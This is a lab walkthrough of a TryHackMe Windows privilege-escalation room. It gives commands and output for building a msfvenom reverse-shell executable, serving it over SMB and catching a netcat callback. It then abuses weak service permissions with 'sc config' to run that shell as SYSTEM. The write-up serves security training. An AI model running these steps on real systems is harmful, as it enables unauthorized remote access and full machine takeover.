# Room
https://tryhackme.com/room/windows10privesc

# Task 1 - Deploy VM and connect using RDP
I use Remmina for RDP: https://remmina.org/

# Task 2 - Generate a reverse shell exe
* Create and transfer reverse.exe to the target
    ```
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=a.b.c.d LPORT=1234 -f exe -o reverse.exe

    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of exe file: 7168 bytes
    Saved as: reverse.exe
    ```
* Start local SMB server to host the file
    ```
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py transfer .

    Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed
    [*] Config file parsed
    ```
* From the target, copy the file
    ```
    PS C:\users\user> cd \privesc
    PS C:\privesc> copy \\a.b.c.d\transfer\reverse.exe .
    PS C:\privesc> dir reverse.exe


        Directory: C:\privesc


    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -a----        1/25/2021   7:17 AM           7168 reverse.exe    
    ```
* Setup a local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Execute reverse.exe on the target
    ```
    PS C:\privesc> .\reverse.exe
    PS C:\privesc>    
    ```
* Check listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.153.222] 49824
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\privesc>
    ```
# Task 3 - Service Exploits - Insecure Service Permissions
Use AccessChk to look at permissions

https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

* Check permissions for the user "user" to the service "daclsvc"
    ```
    C:\privesc>accesschk.exe /accepteula -uwcqv user daclsvc
    accesschk.exe /accepteula -uwcqv user daclsvc
    RW daclsvc
            SERVICE_QUERY_STATUS
            SERVICE_QUERY_CONFIG
            SERVICE_CHANGE_CONFIG      <----------------------
            SERVICE_INTERROGATE
            SERVICE_ENUMERATE_DEPENDENTS
            SERVICE_START
            SERVICE_STOP
            READ_CONTROL
    ```
* Query the daclsvc
    ```
    C:\privesc>sc qc daclsvc
    sc qc daclsvc
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: daclsvc
            TYPE               : 10  WIN32_OWN_PROCESS 
            START_TYPE         : 3   DEMAND_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
            LOAD_ORDER_GROUP   : 
            TAG                : 0
            DISPLAY_NAME       : DACL Service
            DEPENDENCIES       : 
            SERVICE_START_NAME : LocalSystem
    ```
* Because we are allowed the permission SERVICE_CHANGE_CONFIG, we can change things about the service, here we will change the BINARY_PATH_NAME to that of our reverse.exe program
    ```
    C:\privesc>sc config daclsvc binpath= "\"C:\privesc\reverse.exe\""
    sc config daclsvc binpath= "\"C:\privesc\reverse.exe\""
    [SC] ChangeServiceConfig SUCCESS
    ```
* Setup local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...    
    ```
* Start the daclsvc service to execute the new BINARY_PATH_NAME
    ```
    C:\Users\user>net start daclsvc
    ```
* Check listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.153.222] 49873
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>
    ```